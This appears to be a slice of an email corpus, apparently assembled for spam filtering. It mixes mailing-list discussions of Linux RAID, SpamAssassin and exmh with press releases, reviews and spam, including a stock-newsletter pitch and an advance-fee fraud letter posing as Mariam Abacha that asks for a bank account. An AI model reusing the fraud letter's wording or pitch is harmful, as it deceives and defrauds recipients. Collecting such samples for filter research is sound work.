 and manufactured imaginary earnings, auditors gave the 
 balance sheet a big thumbs-up.  As investors lost 
 everything, Enron insiders pocketed millions.
 
 AND THAT should make every investor's blood boil!
 
 Frankly, the Enrons and Global Crossings of the world 
 infuriate me.  All the backroom manipulations dirty 
 dealing and cover-ups really make it hard to know who 
 you can trust.   And that is why we've created a NEW 
 investing service, ""David & Tom Gardner's Motley Fool 
 Stock Advisor"" -- to bring the Motley Fool co-founders' 
 extraordinary commitment to honest stock analysis, 
 fair dealing and complete disclosure to investors like 
 you on a regular and timely basis.
 
 The Motley Fool, which David and Tom founded back in 
 1993, is dedicated to the principle that given the 
 right tools...the average guy can find great success in 
 every aspect of his financial life.
 
 And now, David and Tom are applying this principle -- and 
 their extensive investing experience -- to the new 
 ""Motley Fool Stock Advisor.""  
 
 But as you'll see, this service isn't just about 
 ""buying more stocks.""  OUR GOAL in publishing the 
 ""Motley Fool Stock Advisor"" is twofold:  To help you 
 gain the knowledge, confidence and resolve to make 
 money in the U.S. stock market...while avoiding the 
 biggest mistakes, as well.
 
 The Wall Street analysts touting Global Crossing said 
 its worldwide fiber-optics network would make it the 
 king of telecom.  Now these shares are WORTH NOTHING.  
 Microstrategy was the poster child of the technology 
 bubble-after earnings restatements, the stock now sits 
 99% OFF its high!  Kmart's lousy inventory management 
 and marketing incompetence helped drive the company 
 into BANKRUPTCY.
 
 WHAT ABOUT Nortel and Lucent-two of America's most 
 widely owned stocks.  Will they ever come back?  How 
 about AOL?  Does its merger with Time-Warner mean the 
 GLORY DAYS are over -- or have they just begun?   Are 90% 
 of all telecommunications companies truly in danger of 
 disappearing? If so, which will survive? Will great 
 old names like JP Morgan, Disney and Motorola recover?  
 
 Well, those are the sorts of questions David & Tom 
 Gardner can help you answer at the ""Motley Fool Stock 
 Advisor.""  
 
 As they say, ""Show us the money.""  When it comes to 
 making promises, fast-talkers can fudge just about 
 anything.  But CASH FLOW doesn't lie.
 
 YOU CAN avoid a lot of big mistakes by simply making 
 sure a company has the cash coming in to pay its 
 bills.  And watching cash flow is also one of the best 
 ways to identify superstar companies -- far more reliable 
 than ""earnings"" that can be manipulated 8 ways to 
 Sunday.  Once you eliminate big losers from the 
 equation -- and target the true superstars -- you'll find 
 investing more fun...less stressful...and much more 
 profitable, as well.
 
 So forget about Wall Street's ""damaged goods""-
 companies that have a boatload of debt and accounting 
 woes, as well.  Keep it SIMPLE instead.
 
 ""Simple"" means investing in companies that we all -- with 
 a little effort -- can understand.  Companies where we 
 know what businesses they're really in.  Companies 
 where the financial statements actually mean 
 something.  And companies easily recognizable as the 
 ""best of breed.""
 
 In the free report you received, ""The One Stock That 
 Keeps Wall Street BUZZING,"" you read about one of 
 David & Tom's very favorite investments: Starbucks.  
 Before this company came along, most folks just took 
 coffee for granted.  And certainly, no one proposed 
 any far-reaching business model built around it.  Yet 
 these innovators took a low-margin commodity and built 
 a near $3 BILLION company with more than 5000 
 retail outfits all around the world.
 
 Starbucks has been able to open new outlets based on 
 money it has earned from existing ones. That is an 
 astounding testament to its economic power.  At The 
 Motley Fool Stock Advisor we'll help you find and 
 truly understand the great investments, the companies 
 with solid balance sheets and real growth prospects.   
 Right now we're following companies such as:
 
 *America's most prestigious jeweler -- its brand name 
 has no rival.  With net margins of 59% on sales of 
 $1.6 Billion, this company is a great pick for solid 
 returns with low risk.   
 
 *This software company commands more than 25% of the 
 video game market.  Its shares have returned 6,000% 
 since its public debut in 1989.  An investment of 
 $5,000 in 1989 is now worth over $300,000.  The video 
 game market is expected to double by 2005 with this 
 company enjoying the lion's share of the growth.
 
 *This premier credit rating company has locked-in 
 demand for its reports on the creditworthiness of 
 borrowers holding $30 trillion of the world's debt.  
 It has a 20-year record of consistent sales and income 
 growth and is poised for another stellar year.
 
 YOU CAN TRY the ""Motley Fool Stock Advisor"" for six 
 full months 100% RISK-FREE.  If we don't prove its 
 worth to you, it doesn't cost you a dime.

 Sincerely yours,
 
 Mike Bell, Publisher
 ""David & Tom Gardner's Motley Fool Stock Advisor""
 
 P.S. Do you like BIG PROFITS?  In 1994, investment 
 pros sniffed at America Online's high-flying stock and 
 screamed, ""Overvalued.""  But the Gardners saw three 
 things they overlooked: 1) AOL was building the 
 premier stop in cyberspace; 2) They had a great 
 retention strategy; and 3) Millions of members paying 
 $$$ every month.
 
 So Tom and David bought it.  And today they're sitting 
 on whopping 4,120% gains.  So you see, while they do 
 structure their investing strategy to avoid big 
 blunders...they do make a lot of money, too.  To try the 
 ""Motley Fool Stock Advisor"" RISK-FREE, click here now:

 Eek.  Maybe it's just me, but I don't think that's a good idea. 
 Outputting a message in %post and providing a README of some kind would
 be better, as well as perhaps adding a note in %description.

","NEW PRODUCT ANNOUNCEMENT
 
 From: OUTSOURCE ENG.& MFG. INC.
 
 
 Sir/Madam;
 
 This note is to inform you of new watchdog board technology for maintaining
 continuous unattended operation of PC/Servers etc. that we have released for
 distribution.
   
 We are proud to announce Watchdog Control Center featuring MAM (Multiple
 Applications Monitor) capability.
 The key feature of this application enables you to monitor as many
 applications as you
 have resident on any computer as well as the operating system for
 continuous unattended operation.  The Watchdog Control Center featuring
 MAM capability expands third party application ""control"" of a Watchdog as
 access to the application's
 source code is no longer needed.
 
 Here is how it all works:
 Upon installation of the application and Watchdog, the user may select
 many configuration options, based on their model of Watchdog, to fit their
 operational needs.  If the MAM feature is enabled, the user may select any
 executable program that they wish for monitoring.
 
 A lock up of the operating system or if any one of the selected
 applications is not running, the MAM feature, in
 conjunction with the Watchdog, will reset the system allowing for
 continuous operation.
 
 It's that simple!
 
 Watchdog Control Center is supported on most Microsoft Windows platforms
 (Win9x/WinNT/Win2k) and includes a Linux version for PCI Programmable
 Watchdogs.
 
 Watchdog Control Center Features:
 - Automated installation
 - Controls all Outsource Engineering Watchdogs
 - User selectable Watchdog timeout period
 - User selectable Watchdog stroke interval
 - Multiple Application Monitoring
 
 Included on the Installation CD:
 - Watchdog Control Center
 - Watchdog Drivers
 - Documentation
 
 For more information, please visit out website at
 http://www.outsrc-em.com/ or send an e-mail to sales@outsrc-em.com

 I don't care if the mail is foldered on python.org, but personal
 messages regardless of who they're for, shouldn't be part of the
 public spambayes repository unless specifically approved by both the
 recipient and sender.
 
 Note also that we are much more liberal about python.org/zope.org
 mailing list traffic than most folks.  Read list-managers for any
 length of time and you'll find that there are a lot of people who
 assert strict copyright over their collections, are very protective of
 their traffic, and got really pissed when gmane just started
 gatewaying their messages without asking.
 
 Which might be an appropriate for their lists, but not for ours (don't
 think I'm suggesting we do the same -- I /like/ our laissez-faire
 approach).
 
 But for personal email, we should be more careful.

726,"Subject: RE: [ILUG] mirroring on a running system
","I don't see why not John, but I'd sure backup my data first ;--)
 
 So I suppose you could setup half of the raid1, copy your partitions across,
 vi lilo to append the new device labels, /dev/md0 instead of /dev/hda...
 re-run lilo, then raidhotadd /dev/xxx /dev/md0 [or is that the other way
 around?]
 
 I have never tried this so this could be bollix, I have setup root-raid
 systems but during install time, I have had drive failures on my
 ""production"" systems at home and successfully re-built the raid many times.
 IMHO linux software raid is extremely good.
 
 When are we going to have a pint? 
 
 CW
 
 --------------------------
  I've a running system, and I want to set it up so that the disks are
 mirrored. I'll win a little more read speed, and a lot more reliability.
 
  However, the RAID_HOWTO just mentions RAID 1 and RAID 0 on a machine
 that's new. They don't mention anything about an existing setup. Is it
 possible to setup disk mirroring on a running box ?

 Delete the contents of /usr/local/share/spamassassin and reinstall.  There
 are some files that were new to v2.4x, so they won't be overwritten when you
 downgrade.

 Like what exactly? All the problems are in chemisty and physics and biology
 and mathematics. We're just enablers :)

 Yes, but doing it an order of magnitude or 2 easier does :) Which with the
 way things are now, is not hard at all to do.

 The problem is that Python has a much longer startup time than Perl 
 (though this may have changed recently, I don't know). This is partly 
 why Python was never very popular for CGIs.

 OK, gotcha.
 
 I don't think you can do that with exmh, but you can do it on the
 command line, if you use sh or ksh:
 
 	for f in `folders -fast -r`
 	do
 		echo sorting $f ...
 		sortm +$f
 	done
 
 It could take a long time.
 
 At work, I have to use Outlook.  Ick.  I hate it.  But it does a few
 things right.  Like making indices for each folder, and not just by
 date, but also by sender, message size, subject.  So I can sort by any
 column instantly.
 
 I believe this is possible, too, with an IMAP compliant reader,
 provided the IMAP server makes such indices.
 
 I am facing the fact that exmh has been left behind in some industry
 standards.  I use it for my personal mail.  My mail server runs unix,
 and I connect over ssh and tunnel my X traffic over ssh.  With a slow
 link, this makes exmh very slow.  And mime handling is pretty bad
 compared with modern mailers.  I am just scared to move.  I've been
 using MH or nmh since 1985 and exmh since 1995.  17 years is a long
 time!

 My problem is not the same as MS's one, I don't have to deal with millions of 
 identical copy of the same CD with propably millions of working keys.  Each 
 download can be unique with a small preparation delay.  The key generator is 
 a problem only if multiple keys are usable.  If the end users are teenagers, 
 you'll face a huge wall when asking to be 100% of the time online but if we 
 think of something like a health care system that keep track of patients 
 personnal information, the end user will be willing to take every possible 
 steps to protect the system from his own employees to use illegaly.
 
 I agree with all of you that mass production CDs will not be safe from piracy 
 in a near futur.  That can be seen as a collateral of mass market 
 penetration.
 
 BTW thanks for all of you who provided interestiong insight.  I'm playing with 
 gdb's dissassembler now but I don't think it's what a typical cracker would 
 use.  Any hints on UNIX cracking tools ?

 DataPower delivers XML acceleration device
 ByScott Tyler Shafer
 August 27, 2002 5:46 am PT
 
 DATAPOWER TECHNOLOGY ON Monday unveiled its network device designed 
 specifically to process XML data. Unlike competing solutions that 
 process XML data in software, DataPower's device processes the data in 
 hardware -- a technology achievement that provides greater performance, 
 according to company officials.
 
 The new device, dubbed DataPower XA35 XML Accelerator, is the first in a
 
 family of products expected from the Cambridge, Mass.-based startup. The
 
 DataPower family is based on a proprietary processing core technology 
 called XG3 that does the analysis, parsing, and processing of the XML 
 data.
 
 According to Steve Kelly, CEO of DataPower, the XA35 Accelerator was 
 conceived to meet the steady adoption of XML, the anticipated future 
 proliferation of Web services, and as a means to share data between two 
 businesses.
 
 ""Our vision is to build out an XML-aware infrastructure,"" Kelly said. 
 ""The XA35 is the first of a family.""
 
 Kelly explained that converting data into XML increases the file size up
 
 to 20 times. This, he said, makes processing the data very taxing on 
 application servers; DataPower believes an inline device is the best 
 alternative.
 
 In addition to the large file sizes, security is also of paramount 
 importance in the world of XML.
 
 ""Today's firewalls are designed to inspect HTTP traffic only,"" Kelly 
 said. ""A SOAP packet with XML will go straight through a firewall. 
 Firewalls are blind to XML today.""
 
 Future products in DataPowers family will focus more specifically on 
 security, especially as Web services proliferate, Kelly said.
 
 According to DataPower, most existing solutions to offload XML 
 processing are homegrown and done in software -- an approach the company
 
 itself tried initially and found to be inadequate with regards to speed 
 and security. After trying the software path, the company turned to 
 creating a solution that would process XML in hardware.
 
 ""Our XG3 execution core converts XML to machine code,"" said Kelly, 
 adding that to his knowledge no other company's solution does. Kelly 
 said in the next few months he expects the market to be flooded with 
 technologies that claim to do XML processing -- claims that he believes 
 will be mostly false.
 Other content-aware switches, such as SSL (secure socket layer) 
 accelerators and load balancers, look at the first 64 bytes of a packet,
 
 while the XA35 provides deeper packet inspection, looking at 1,400 bytes
 
 and thus enabling greater processing of XML data, Kelly explained.
 
 The 1U-high network device has been tested against a large collection of
 
 XML and XSL data types and can learn new flavors of the markup language 
 as they pass through the device.
 
 The XA35 can be deployed in proxy mode behind a firewall and a load 
 balancer, and it will inspect all traffic that passes and will identify 
 and process those packets that are XML, Kelly said.
 
 In addition to proxy mode, the device can also be used as an application
 
 co-processor. This deployment method gives administrators more granular 
 control over what data is inspected and the application server itself 
 controls the device.
 
 DataPower is not the only company chasing this emerging market. Startup 
 Sarvega, based in Burr Ridge, Ill., introduced the Sarvega XPE switch in
 
 May, and earlier this month Tarari, an Intel spin-off, launched with a 
 focus on content processing and acceleration.
 The DataPower device is now available, priced starting at $54,995. The 
 company has announced one customer to date and says the product is in 
 field trails at a number of other enterprises.
 
 ========================================================================

 DataPower has been addressing enterprise networking needs since it was 
 founded in early 1999 by Eugene Kuznetsov, a technology visionary who 
 foresaw the adverse effects XML and other next generation protocols 
 would have on enterprise networks. Long before industry interest in XML 
 grew, Kuznetsov assembled a team of world-class M.I.T. engineers and 
 designed the industry's first solutions to address the unique 
 requirements for processing XML. The first such solution was a software 
 interpreter called DGXT. This software-based approach to XML processing 
 is still licensed by many companies for use in their own products today.
 
 Leveraging the detailed knowledge and customer experience gained from 
 developing software-based accelerators, Kuznetsov's team raised the bar 
 and designed a system for processing XML in purpose-built hardware. In 
 2001, DataPower's effort produced XML Generation Three (XG3), the 
 industry's fastest technology for XML processing, bar none.
 
 Today, XG3 technology powers the industry's first wire-speed XML 
 network devices, enabling secure, high-speed applications and XML Web 
 Services. While other companies are just now marketing first versions of
 
 products, DataPower is delivering its third generation of technology, 
 providing an immediate return on technology investments to 
 industry-leading customers and partners.
 
 DataPower's M.I.T. heritage is complemented by a management team that 
 brings decades of experience in the networking and computing industries,
 
 drawing veteran leaders from several successful companies including 
 Akamai, Argon, Cascade, Castle Networks, Sycamore and Wellfleet.

 intra-company communications but their network infrastructure is ill 
 prepared to support the requirements of this new traffic type. 
 DataPowers XML-acceleration devices enable the wirespeed processing of 
 XML that is required to support next generation enterprise 
 applications,"" said Eugene Kuznetsov, CTO and founder of DataPower 
 Technology.
 
 ""DataPower gives companies the ability to use XML thats critical to Web
 
 services projects without sacrificing an ounce of performance."" A single
 
 DataPower acceleration engine delivers the processing power of 10 
 serversbreaking the performance bottleneck associated with XML 
 processing and delivering an extraordinary return on investment. In 
 addition, the DataPower platform provides enhanced XML security, 
 protection against XML-based denial-of-service attacks, connection of 
 e-business protocols for incompatible XML data streams, load balancing 
 between back-end servers and real-time statistics reports.
 
 ""In the post-bubble economy, technology investment decisions require 
 laser-focused scrutiny. DataPowers patent-pending technology addresses 
 a very real and growing pain point for enterprises,"" said Michael 
 Tyrrell of Venrock Associates. ""By turbo-charging their networks with 
 DataPowers unique XML-Aware networking technology, companies will be 
 free to adopt next generation Web services without encountering 
 performance and security pitfalls.""
 
 ""We looked long and hard for a company capable of addressing the rapidly
 
 growing problems surrounding XML message processing performance and 
 security,"" said Bill Burnham of Mobius Venture Capital. ""DataPower is on
 
 their third generation of technology. Their patent pending XML 
 Generation Three (XG3)technology was quite simply the single most 
 compelling technology solution we have seen to date.""
 
 ""XML is not a nice-to-have, it is a must have for enterprises serious 
 about optimizing application efficiency. Since 1999, DataPower has been 
 developing solutions to facilitate enterprise use of XML and Web 
 services,"" said Jeff Fagnan of Seed Capital Partners. ""DataPowers 
 XML-acceleration devices are a key requirement for enterprises that rely
 
 on XML for mission critical applications.""

","Hi,
 
 I've got an normal 3.5"" CD-RW IDE drive that I'd like to be able to use with a
 Dell Latitude CPx laptop that I've got. Does anyone know any way to enable this,
 for example through the use of a special cable for the Modular Bay (where CD-ROM
 or floppy drive is normally).
 
 There is also the possibility of using a docking station, but Dell's docking
 solution for the Latitude series doesn't seem to allow for the use of an IDE
 drive, only SCSI... Unless someone knows of a ""non-Dell"" solution that's
 compatible.
 
 Anyone any ideas?
 
 Thanks,
 
 Darren.

","PRESS RELEASE FROM THE AYN RAND INSTITUTE
 2121 Alton Parkway, Suite 250
 Irvine CA 92606
 
 July 24, 2002
 FOR IMMEDIATE RELEASE
 
 GOVERNMENT REGULATION IS KILLING THE STOCK MARKET
 
        IRVINE, CA -- The steep decline in the stock market is being fueled
 by investors' realization that increasing government constraints on
 corporate America will harm business and the economy--not help them, said
 Yaron Brook, executive director of the Ayn Rand Institute.
 
        ""Instead of launching a witch-hunt against CEOs and rushing to give
 the government wider powers over business, we should get rid of the complex
 and contradictory regulations that encourage bad accounting and prevent
 shareholders from acting in their own interest.""
 
        ""The common explanation that 'greed' is to blame makes no sense--the
 abuses in companies like Enron and WorldCom were not exercises in
 self-interest, but in self-destruction.
 
        ""In an unfettered free market the desire for profit is satisfied by
 honest, long-range, rational behavior: by innovating, by hiring the best
 employees, by selling quality products and by providing accurate information
 to the owners of the corporation--the shareholders. As for short-range
 managers, the markets will not tolerate them. As for the real swindlers,
 existing laws against force and fraud are sufficient to protect us.""
 
        ""If our politicians are indeed concerned about the stock market,""
 said Dr. Brook, ""let them demonstrate it by eliminating, not adding,
 regulations and making the market truly free.""
 
 ###   ###   ###
 
 Ayn Rand Institute executive director Dr. Yaron Brook is available for
 interviews on this topic.

 Well lets see, about 99% of all anime? In anime dead people can talk, email,
 hang out, and generally lead normal lives. Come to think of it they tend to
 be the primary characters ;)
 
 But I suspect you mean Serial Experiments Lain, in which the initial ""i'm

 oops.  OK, now fixed; I've updated b2_4_0 to match what I wanted,
 accordingly.  As a result, mass-checks do *NOT* need to be restarted as
 the code and rules are the same as they were on HEAD.
 
 cvs tag spamassassin_pre_2_4_0b
 
 So, in full, here's the changes that are in spamassassin_pre_2_4_0b that
 were not there before the branch:
 
   - rules fixed: HTTP_ESCAPED_HOST, HTTP_CTRL_CHARS_HOST.  they were too
     lax and caused FPs
 
   - Matt's faster HTML parser
 
   - commented rules un-commented again
 
   - a doco fix for spamd
 
 
 and, for completeness, the relevant changes since Saturday:
 
   - the INSTALL file ;)
 
   - CALL_NOW now starts on a word boundary
 
   - Added examples to -R docs
   
   - Added Habeas HIL lookup
 
   - bug 385: spamcheck.py should handle 4xx errors -- full mailboxes etc.
     -- with EX_TEMPFAIL. patch from ckd-spamassassin@ckdhr.com
     (Christopher Davis) applied.
 
   -  made spamcheck.py use exit code 75 if it cannot connect to spamd,
      fixes bug 655
 
   - spamd/spamd.raw: fixed bug 704: spamd was not able to unlink pid file
     with -u arg
 
   - Makefile.PL: installing to random dirs now works fine
 
   - move MAILER_DAEMON into 70_cvs_rules_under_test.cf since it has been
     improved remove extraneous mass-check line for DATE_YEAR_ZERO_FIRST
 
   - spamassassin.raw: merged -Z with -D
 
   - removed eff.org from whitelists, as per Marc's request
 
   - mass-check: added versioning and date to mass-check output
 
   - bug 658: ok_locales set to 'en' by default. changed to 'all', users
     will have to customise for themselves.   Made many tests which trigger
     FPs on mail in ISO-2022-JP charsets, meta rules depending on
     __ISO_2022_JP_DELIM.
 
   - fixed phrase-freq code for vastly better performance
 
   - rules/50_scores.cf: changed LISTBUILDER score back to -5.0
 
   - lib/Mail/SpamAssassin/HTML.pm: catch background images in uri code
     catch additional types of web bugs
 
   - rules/20_body_tests.cf: change CASHCASHCASH to meta rule to avoid
     Japanese false matches, revise spam phrases descriptions to be clearer
     (since a few are now basically compensation tests (please don't move
     them to the compensation file))
 
   - fixed bug in MIME_SUSPECT_NAME: text/plan attachments called foo.html
     were triggering.
 
   - revise HTML comment tests to use HTML parser
 
   - revise MAILER_DAEMON rule (get rid of some spam matches without losing
     any nonspam matches)
 
   - raise some negative scores that are way too low
 
   - remove ""Friend"" from DEAR_SOMETHING since it overlaps with DEAR_FRIEND
     and can match ""dear friend"" in middle of sentence too much
 
   - require ""Dear Friend"" to start the paragraph
 
   - add new HTML tests for font colors and faces, reduce number of
     different eval functions needed for HTML tests

 Point is, you're not likely to extrapolate much.  I could probably

 Listen.  If you pull numbers like that without a fact, the automagic
 assumption is yes, they were extracted out of your neither orifice.
 Point wasn't to conclude otherwise unless you had any relevant bits.
 Its not my job to do _your_ bit searching for you, but I figured I'd
 humor fork with this bit of finding:

 WTF do my shitty math skillz have to do with girls and
 hyperpromiscuity?  I was speaking -generally- meaning that guys and
 girls probably have better things to do than boink everything they
 see.  As above, I am assuming you're pulling things out of your ass, I
 just felt like calling you on it.
 
 BTW, there's nothing wrong with calling someone on a silly idea.  Its
 allowed, and its generally not considered ad hominem, but the
 homophobia statement might be.

 Many times.  Which is why I said 'assuming that large ... (The meccas
 dont count).  SF is a mecca in this example.  I obviously wasn't
 clear, tho one could assume I wasn't talking about Medina.

 EL> This doesn't happen because it couldn't happen. No one would want to. 
 EL> Because you feel that way. Correct?
 
 doesn't happen?  true.   Couldn't happen?  who knows.   It has nothing
 to do with how I 'feel' and everything to do with the fact that people
 do concern themselves with more than just sex (otherwise I think we'd
 see a helluva lot more of sex, and a helluva lot less of everything
 else).

 Well my suggestion is, if you can't take the responses, don't post
 flamebait.

 Lockergnome's Guide to Converting Vinyl LPs to CD is no longer free. 
 Over the last 10 days, almost 4,000 people downloaded the free tome. 
 Of that 4,000, close to half put in a fake e-mail address, resulting 
 in a ridiculous number of bounce messages in my inbox. Add to that 
 the fact that several of the clever individuals used other people's 
 real addresses, which then amounted to complaints of spam from the 
 address owners. It's not worth providing a free service if it causes 
 Lockergnome to be labeled a spammer as a result. The crowning gem was 
 the in-duh-vidual who used the name A** Hole and Chris's personal 
 address to download the PDF. On a more positive note, the guide is 
 <a href=""http://www.gnometomes.com/tome/001962.html"">now available in all six formats</a>,  
 for the minimal price of $5, complete with some additional content 
 based on a couple reader suggestions.
 <p>
 Chris may have an obsession with Peets coffee, but I'll bet he's never 
 been the daily special. On my visit to St. Louis, for the 
 <a href=""http://www.sic.org"">SIC</a>, I 
 started every morning with a walk to the West Port Starbucks. 
 Apparently my morning ritual was a source of entertainment for the 
 employees, which evolved into discussions of a reality based TV show 
 based on the concept of stalking me. I've even got the 
 <a href=""http://www.lockergnome.com/images/jakepics/starbucks.jpg"">incriminating evidence</a> 
 to prove it.
 <p>
 The SIC provided me the opportunity to see some cool updates to a couple 
 titles, in addition to being introduced to some useful audio oriented 
 titles I'd never seen before. Expect a number of reviews over the next 
 several weeks, as well as extensive coverage of last week's events in 
 St. Louis in the annual SIC special issue. Lori managed to score a few 
 more Gnomedex giveaways while we were in attendance, so those of you who 
 sign up will be coming home with even more goodies, which, by the way, 
 aren't of the stressball and pen variety -- we're talking software 
 titles with reg codes.

 If you're in San Antonio July 23-25, for this year's Siggraph conference, 
 you'll want to stop by the nVidia booth (#19102). Every 30 minutes 10 
 people will be competing for a NVIDIA Quadro4 750 XGL professional 
 graphics solution, using NVIDIA-provided traditional art materials such 
 as charcoal, pastels, crayons and paper to create something artistic. 
 All artwork must be original, unpublished work. Artwork must also
 incorporate the NVIDIA logo and be created on-site at SIGGRAPH during the
 10-minute contest round. Judging will be based on artistry; creativity and
 originality; technical merit; and theme incorporation. Artwork will not be
 returned to contestants and will become the property of NVIDIA as outlined
 in the contest registration form. Even if you don't win, you'll still get a free t-shirt.

 Playing games on a PDA has killed plenty of my time spent waiting in 
 airports around the US. With the recent porting of these three classic 
 PC card games from DreamQuest, I've added some of the best in PC 
 entertainment to my arsenal of PDA diversions. Hearts, Spades and Euchre 
 all play in a similar manner to their PC versions, only on a smaller 
 screen. Available for Pocket PC, Palm, and even the Symbian OS, you can 
 play cards against computer opponents or connect to the online game room 
 and challenge other players using any of the games multiple platforms. 
 This is a unique experience currently unavailable for any other pocket games.

 Blending punk rock attitude with country twang makes for a fairly 
 unique musical experience. I saw these guys play a show in Omaha, 
 back in January of this year and was blown away by their stage 
 presence. Rexway rip through an opening set with enough energy to 
 kick-start even the most somber crowd, moving everyone in the 
 audience to their feet and setting the scene for an entertaining 
 evening. As with most punk, the lyrics are equal parts politics 
 and angst, with enough colorful language to drop a jaw or two. 
 Tool fans should check out the countrified version of the classic 
 HWAP; it's kind of like a cover tune, only more unique. If you 
 are offended by 4-letter words, this band isn't for you.

 In disembodied first person Clockwork style narration,  Croupier
 pessimistically compares our lives to those of hapless casino gamblers.
 We know the odds are stacked against us, yet we continue to play the
 games. Gamblers, or ""punters"" as they are more derogatorily known,
 however, play their games under the watchful eyes of the croupier
 (casino dealer).  Constantly pulled by the siren song of fast money, the
 croupier knows better than anyone that to play is to lose. Thus, the
 cool croupier relegates himself to his addiction of watching others
 lose. Jack Manfred (Clive Owen) is the croupier, raised by his croupier
 father (Nicholas Ball) who taught him all the tricks of the trade.
 Through his losses both in the casino and in his personal life, Jack's
 father also taught Jack that the only way to win is not to play. Punters
 are sorry sods; the croupier is king. From father to son, the lesson
 passes -- watching others strive and falter is the only real enjoyment
 in life. Despite decades of croupier training, Jack is compelled to
 write the great novel burning deep inside him, yearning to escape.
 Jack's publisher regrettably relates to Jack that his novel idea is
 trite; stories of real life graft and corruption are what sell. When
 Jack's father informs Jack of a casino opening in a small London Casino,
 Jack snatches the opportunity to parlay his skill into a novel exposing
 the seedy underbelly of London's casinos. Unfortunately, Jack's ex-cop
 girlfriend sees the job hardening and irreparably changing Jack for the
 worst. In an attempt to fool himself, Jack creates alter ego ""Jake"" to
 bear the brunt of inequity, attempting to maintain Jack both morally and
 physically unscathed. The absence of any clear delineation between the
 personas becomes apparent when a lovely punter (Alex Kingston)
 approaches Jack with a scheme to rob the casino. Jack slowly comes to
 the realization that no one can have it both ways, either in the casino
 or in life. You are either in the game, or you are not. Seasoned veteran
 director Michael Hodges deftly crafts this tale around the subtle
 talents of the ultra cool Clive Owen. Owen rules this drama, not with
 flex and volume, but with glances and nods. Less is truly more, much
 more, in this low budget escape from the unsatisfying blockbuster
 suspense films of recent memory. Croupier proves that it is not a large
 budget, but direction, dialogue and acting that drive the genre.

759,"Subject: your help
","DEAR SIR,
 
 I am MRS MARIAM ABACHA, wife of the late Nigerian
 Head of State, General Sani Abacha who died on 
 the 8th
 of June 1998 while still on active duty. I am
 contacting you in view of the fact that we will 
 be of
 great assistance to each other likewise 
 developing a
 cordial relationship.
 
 I currently have within my reach the sum of 
 thirty
 six million United States Dollars 
 (US$36,000,000) in
 cash, which I intend to use for investment 
 purposes
 specifically in your country. This money came 
 as a
 result of a payback contract deal between my 
 late
 husband and a Russian firm on our country's
 Multi-Billion Dollars Ajaokuta Steel Plant. The
 Russian partners returned my husbands share of
 US$36,000,000 after his death and lodge it with 
 my
 late husband's security company in Nigeria of 
 which I
 am a director. Right now the new civilian 
 government
 have intensified their probe on my husband's 
 financial
 resources and they have revoked our licenses 
 that
 allows us to own a financial and oil company. 
 In view
 of this, I acted very fast to withdraw the
 US$36,000,000 from the company's vault and 
 deposited
 it in a privately erected security safe abroad.
 
 No record ever existed concerning the money 
 neither is
 the money traceable by the Government because 
 there is
 no documentation showing that we received the 
 money
 from the Russians.
 
 Due to the current situation in the country 
 concerning
 Government attitude towards my family, it has 
 become
 quite impossible for me to make use of this 
 money
 within, thus I seek assistance to transfer this 
 money
 into your safe bank account. On your consent, I 
 shall expect
 you to contact me urgently to enable us discuss
 details of this transaction.
 
 Bearing in mind that your assistance is needed 
 to
 transfer the funds, I propose a commission of 
 20% of
 the total sum to you for the expected services 
 and
 assistance. Your urgent response is highly 
 needed so
 as to stop further contacts. all correspondent 
 should be forwarded to this EMAIL:zenab.m@ompadec.zzn.con
 or you can call my son mobile:hamza   234-8023137978 I  use this 
 opportunity to implore you to exercise the most 
 utmost
 indulgence to keep this matter extra ordinarily
 confidential what ever your decision while I 
 await your
 prompt response.
 
 Best personal regards,
 
 MRS MARIAM ABACHA.

 That got a good laugh out of me.   Just saying ""crucial hair feature"" 
 improves my day immeasurably.
 
 I've done a fair amount of thinking about the ""media intermediated"" meeting 
 thing.   It seriously loses for reasons like Rohit's just encountered.   
 One is both rejected for trivial reasons and rejects for the same.
 Some people loudly defend that these choices are not trivial.
 
 I'd have never met my best friend if I had to pick her out of a crowd for 
 getting to know.   I was a teen at the time, but I won't say I'm much 
 improved at being able to spot ""interesting"" at a distance.   Interesting 
 isn't an external thing.  I have that brought home to me again every so 
 often.  I may think that interesting people dress differently or whatever, 
 but that's total superstition.   How do I know what your version of 
 creative attire is?  Maybe it's purely functional.
 
 I was at a loud party recently, sufficiently loud that conversation of any 
 kind was extremely difficult, and intoxication was the norm.   I was 
 working on what my algorithm for meeting people there should be and one of 
 the candidates was ""women, in order of attractiveness.""   I flinched from 
 that, rather violently.   At a trade show, or something, I might elect to 
 talk to the people who are looking at interesting exhibits.   At a 
 party.....well, if you can't hear the conversation they are having, or if 
 on the net all you have is a photo.....
 
 You just can't tell important things from a picture and a few words.  It's 
 not how we are built.   There's no geek code for the heart and soul.
 (And if there were people would lie and game the system.)
 It's too easy to say ""Oh, no!  He's a geek!""   or ""She's a CAT person, 
 ick!"" when you might have a great time together.
 
 We are constructed to form alliances based on how we fit together as 
 people, how we feel in the other person's company, how well we partner on 
 tasks and recreation.   This is all entirely speculative based on nothing 
 but superstitious association unless you actually have time in the 
 person's company.   Which is why we tend to be screwed when our circle of 
 exposure shrinks after school.
 
 Personally, as a writer, the whole internet meet & email thing ought to 
 work better for me than it does for other people, but interestingly, it 
 doesn't.   I have to put out the same amount of effort and reap about the 
 same poor results.    I have to think it's not the people, but the tool.
 
 An aside (okay, yes, I'm a tool geek):  Speed Dating
 Speed Dating (aka 7 Minute Dating) is a live-action stab at actual time in 
 the company of a variety of people, compressed into one event.   I think 
 it's noticably better, but still absolutely nothing like working on a 
 project together, cooking, climbing a mountain or whatever.
 It was, in fact, invented as a jewish thing seeking to match up the young 
 people to avoid total assimilation.   It has too much ""interview"" context 
 and no shared activity beyond that.   I give it several points for effort 
 though. 
 
 I guess my impression that even the Speed Dating thing doesn't do much for 
 you means that the traditional advice of ""join activities groups"" is 
 actually sound.

 When posting to this list excerpts from books I've just read, I usually
 refrain from adding any comments, letting the listmembers interpret them

 But since you asked....
 
 I chose to post this text simply because I thought it was a particularly

 I have to agree here.  If Habeas is going to die just because SA does not
 support it, that's a serious problem with the business model; but that is
 nobody's problem but Habeas's.
 
 A possible solution is for Habeas's business model to include some kind of
 incentive for users of SA to give it the benefit of the doubt.  I have yet
 to think of an incentive that fits the bill ...

 This is off the topic of the rest of this discussion, but amavisd (in all
 its incarnations) and MIMEDefang and several other MTA plugins all reject
 at SMTP time messages that scores higher than some threshold (often 10).  
 If some new release were to start scoring all spam no higher than 5.1,
 there'd better be _zero_ FPs, because all those filters would drop their
 thresholds to 5.

 Newsletters won't use the mark.  Habeas is priced way too high -- a factor
 of at least 20 over what the market will bear, IMO -- on a per-message
